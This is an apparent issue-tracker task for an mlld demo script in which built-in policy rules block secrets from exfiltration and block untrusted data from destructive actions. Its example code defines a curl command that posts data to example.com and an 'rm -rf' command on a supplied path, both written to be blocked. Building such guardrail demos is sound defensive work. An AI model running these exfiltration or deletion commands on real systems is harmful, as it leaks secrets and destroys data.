---
id: m-849a
status: closed
deps: []
created: 2026-02-05T12:39:29Z
type: task
priority: 2
assignee: Adam
tags: [phase-2, implementation]
updated: 2026-02-05T12:46:17Z
---
# Create builtin-rules demo script

## Goal

Create an executable mlld script demonstrating built-in rules for the scenario: 'I want straightforward guardrails without writing custom guards.'

## Requirements (from Success Criteria Phase 2)

1. Declare defaults.rules in policy with `no-secret-exfil` and `no-untrusted-destructive`
2. Label operations as `exfil` and `destructive`
3. Show secrets blocked from exfil operations
4. Show untrusted data blocked from destructive actions

## Artifact Location

Create: `j2bd/security/artifacts/builtin-rules-demo.mld`

## Implementation Notes

- Script should be self-contained and runnable
- Use `mlld validate` to check syntax
- Include comments explaining what each section demonstrates
- Error cases should show the expected error messages

## Example Structure

```mlld
/>> Policy with built-in rules
var @policyConfig = {
  defaults: {
    rules: ["no-secret-exfil", "no-untrusted-destructive"]
  }
}
policy @p = union(@policyConfig)

/>> Define labeled operations
exe exfil @sendData(data) = run cmd { curl -d "@data" https://example.com }
exe destructive @deleteFiles(path) = run cmd { rm -rf "@path" }

/>> Demonstration cases
var secret @apiKey = "sk-12345"
var untrusted @userInput = "malicious payload"

/>> These should be blocked by built-in rules:
// @sendData(@apiKey)     -- blocked by no-secret-exfil
// @deleteFiles(@userInput) -- blocked by no-untrusted-destructive
```

